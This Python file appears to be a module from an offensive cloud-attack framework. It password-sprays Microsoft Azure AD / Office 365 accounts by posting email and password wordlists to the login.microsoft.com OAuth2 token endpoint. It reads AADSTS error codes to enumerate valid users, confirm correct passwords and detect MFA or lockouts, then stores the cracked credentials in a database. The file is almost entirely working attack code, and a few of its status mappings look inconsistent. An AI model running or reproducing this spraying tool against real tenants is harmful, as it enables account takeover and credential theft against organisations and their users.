import json
import sys

import mongoengine
import flask_mongoengine
import requests
import werkzeug
from termcolor import colored
from core.database import models
from alive_progress import alive_bar

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
	"SERVICE": {
		"value": "none",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"EMAIL":{
		"value":"",
		"required":"false",
        "description":"The email of the user to test."
	},
	"WORDLIST":{
		"value":"",
		"required":"false",
        "description":"A wordlist of emails"
	},
	"PASSWORD":{
		"value":"",
		"required":"false",
        "description":"The password to test against the email/email list"
	},
	"PASSWORD-WORDLIST":{
		"value":"",
		"required":"false",
        "description":"A list of passwords to test against the email/email list"
	},
	"VERBOSE":{
		"value":"true",
		"required":"true",
        "description":"Get the status of all the emails. If not, you will only have the correct ones"
	}
}

description = ""

aws_command = "No awscli command"

def exploit(workspace):
	userfile = variables['WORDLIST']['value']
	theemail = variables['EMAIL']['value']
	password = variables['PASSWORD']['value']
	password_wordlist = variables['PASSWORD-WORDLIST']['value']
	all_output = []

	verbosity = variables['VERBOSE']['value']

	if not theemail == "" and not userfile == "":
		return {"error": "[*] Only add a username or a user file. Not both."}, 500

	if (password_wordlist == "" and password == "") or (not password_wordlist == "" and not password == ""):
		return {"error": "[*] Add at least a password or a password file. Not both though."}, 500

	if theemail == "" and userfile == "":
		return {"error": "[*] Add at least a username or a user file. Not both though."}, 500

	elif not theemail == "":
		email = theemail.replace("\n", "")
		if not password == "":
			state = password_spray(email, password)
			single_user_info = database_info(state, email, password)
			return_info_dict = return_info(state, email, password)
			email.replace("\n", "")
			#print(state)
			if not state in [-1, 0, 1, 8, 9]:
				try:
					emails = models.AzureUsers.objects().get_or_404(azure_user_email=email)
					emails.update(**single_user_info)

				except werkzeug.exceptions.NotFound:
					models.AzureUsers(**single_user_info).save()

				except Exception as e:
					e = str(e)
					if "Tried to save duplicate unique keys" in e:
						models.AzureUsers.objects().get(azure_user_email=email).update(**single_user_info)
					else:
						return {"error": e}, 500

			if "error" in return_info_dict:
				return {"email": {
					"email": email.replace("\n", ""),
					"result": return_info_dict["error"]}}, 200

			else:
				return {"email": {
					"email": email,
					"result": return_info_dict['message']}}, 200
		else:
			pass_file = open(password_wordlist, "r")
			for passw in pass_file.readlines():
				state = password_spray(email, passw.replace("\n", ""))
				single_user_info = database_info(state, email, passw.replace("\n", ""))
				return_info_dict = return_info(state, email, passw.replace("\n", ""))
				email.replace("\n", "")
				#print(state)
				if not state in [-1, 0, 1, 8, 9]:
					try:
						emails = models.AzureUsers.objects().get_or_404(azure_user_email=email)
						emails.update(**single_user_info)

					except werkzeug.exceptions.NotFound:
						models.AzureUsers(**single_user_info).save()

					except Exception as e:
						e = str(e)
						if "Tried to save duplicate unique keys" in e:
							models.AzureUsers.objects().get(azure_user_email=email).update(**single_user_info)
						else:
							return {"error": e}, 500

				if "error" in return_info_dict:
					if verbosity.lower() == 'true':
						all_output.append(return_info_dict['error'])
					else:
						pass
				else:
					all_output.append(return_info_dict['message'])
			return {"Wordlist": {"Wordlist": password_wordlist,
							 "output": all_output}}, 200
	elif not userfile == "":
		theuserfile = open(userfile, 'r')
		if not password == "":
			for um in theuserfile.readlines():
				usermail = um.replace("\n", "")
				state = password_spray(usermail, password)
				single_user_info = database_info(state, usermail, password)
				return_info_dict = return_info(state, usermail, password)

				if "error" in return_info_dict:
					if verbosity.lower() == 'true':
						all_output.append(return_info_dict['error'])
					else:
						pass
				else:
					all_output.append(return_info_dict['message'])
				#print(state)
				if not state in [-1, 0, 1, 8, 9]:
					try:
						emails = models.AzureUsers.objects().get_or_404(azure_user_email=usermail)
						emails.update(**single_user_info)

					except werkzeug.exceptions.NotFound:
						models.AzureUsers(**single_user_info).save()


					except Exception as e:
						e = str(e)
						if "Tried to save duplicate unique keys" in e:
							models.AzureUsers.objects().get(azure_user_email=usermail).update(**single_user_info)
						else:
							return {"error": e}, 500

		else:
			theuserfile = open(userfile, 'r')
			pass_file = open(password_wordlist, "r")
			userEmails = theuserfile.readlines()
			userPass = pass_file.readlines()
			with alive_bar(len(userEmails)) as bar:
				for um in userEmails:
					for passw in userPass:
						usermail = um.replace("\n", "")
						state = password_spray(usermail, passw.replace("\n", ""))
						single_user_info = database_info(state, usermail, passw.replace("\n", ""))
						return_info_dict = return_info(state, usermail, passw.replace("\n", ""))

						if "error" in return_info_dict:
							if verbosity.lower() == 'true':
								all_output.append(return_info_dict['error'])
							else:
								pass
						else:
							all_output.append(return_info_dict['message'])

						#print(state)
						if not state in [-1, 0, 1, 8, 9]:
							try:
								emails = models.AzureUsers.objects().get_or_404(azure_user_email=usermail)
								emails.update(**single_user_info)

							except werkzeug.exceptions.NotFound:
								models.AzureUsers(**single_user_info).save()

							except Exception as e:
								e = str(e)
								if "Tried to save duplicate unique keys" in e:
									models.AzureUsers.objects().get(azure_user_email=usermail).update(**single_user_info)
								else:
									return {"error": e}, 500
					bar()

		return {"Wordlist": {"Wordlist": userfile,
							 "output": all_output}}, 200

def password_spray_o365(user, password):
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56"

	s = requests.Session()
	s.headers.update({"User-Agent": userAgent})
	s.get('https://outlook.office365.com' )

def password_spray(user, password):
	headers = {
		#"User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56",
		"Accept": "application/json",
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	body = {
		"resource": "https://graph.windows.net",
		"client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
		"client_info": '1',
		"grant_type": "password",
		"username": user,
		"password": password,
		"scope": "openid"
	}
	codes = {
		0: ['AADSTS50034'],  # INVALID
		1: ['AADSTS50126'],  # VALID
		3: ['AADSTS50079', 'AADSTS50076'],  # MSMFA
		4: ['AADSTS50158'],  # OTHER MFA
		5: ['AADSTS50053'],  # LOCKED
		6: ['AADSTS50057'],  # DISABLED
		7: ['AADSTS50055'],  # EXPIRED
		8: ['AADSTS50128', 'AADSTS50059'],  # INVALID TENANT
		9: ['AADSTS50056']  # INVALID TENANT
	}

	url = "https://login.microsoft.com"

	state = -1
	body['username'] = user
	response = requests.post(
		url + '/common/oauth2/token',
		headers=headers,
		data=body
	)

	# States
	# 0 = invalid user
	# 1 = valid user
	# 2 = valid user/pass
	# 3 = MS MFA response
	# 4 = third-party MFA?
	# 5 = locked out
	# 6 = acc disabled
	# 7 = pwd expired
	# 8 = invalid tenant response

	if response.status_code == 200:
		state = 2

	else:
		respErr = response.json()['error_description']

		for k, v in codes.items():
			if any(e in respErr for e in v):
				state = k
				break

	return state

def return_info(state, user, password):
	if state == -1:
		return {"error": "[*] Unknown Error"}
	elif state == 0:
		return {"error": "[*] User {} does not exist".format(user)}
	elif state == 1:
		return {"message": "[*] Password incorrect: {}:{}".format(user, password)}
	elif state == 2:
		return {"message": "[*] User and password correct: {}:{}".format(user, password)}

	elif state == 3:
		return {"message": "[*] User and password correct, but requires mfa: {}:{}".format(user, password)}

	elif state == 4:
		return {"message": "[*] User and password correct, but requires mfa: {}:{}".format(user, password)}

	elif state == 5:
		return {"message": "[*] User and password correct, but user is locked: {}:{}".format(user, password)}

	elif state == 6:
		return {"message": "[*] User and password correct, but password is expired: {}:{}".format(user, password)}

	elif state == 7:
		return {"message": "[*] User and password correct, but account is disabled: {}:{}".format(user, password)}

	elif state == 8:
		return {"error": f"[*] {user}: Invalid Tenant ID"}

	elif state == 9:
		return {"error": f"[*] Invalid user {user} or missing password. Is the user part of an ADFS Account?"}

def database_info(state, user, password):
	if state == 1:
		return {
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_password": "",
			"azure_user_mfa_enabled": False,
			"azure_user_password_expired": False,
			"azure_user_locked": False,
			"azure_user_disabled": False
		}
	elif state == 2:
		return {
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": False,
			"azure_user_password_expired": False,
			"azure_user_locked": False,
			"azure_user_disabled": False
		}

	elif state == 3:
		return {
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": True,
			"azure_user_password_expired": False,
			"azure_user_locked": False,
			"azure_user_disabled": False
		}
	elif state == 4:
		return {
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": True,
			"azure_user_password_expired": False,
			"azure_user_locked": False,
			"azure_user_disabled": False
		}
	elif state == 5:
		return {
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": False,
			"azure_user_password_expired": False,
			"azure_user_locked": True,
			"azure_user_disabled": False
		}
	elif state == 6:
		return {
			
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": False,
			"azure_user_password_expired": False,
			"azure_user_locked": False,
			"azure_user_disabled": True
		}
	elif state == 7:
		return {
			
			"azure_user_email": user,
			"azure_user_domain": user.split("@")[1],
			"azure_user_has_password": True,
			"azure_user_password": password,
			"azure_user_mfa_enabled": False,
			"azure_user_password_expired": True,
			"azure_user_locked": False,
			"azure_user_disabled": False
		}
	elif state == 8:
		return {"error": "[*] Invalid Tenant ID"}, 500

	elif state == 9:
		return {"error": f"[*] Invalid user {user} or missing password. Is the user part of an ADFS Account?"}, 500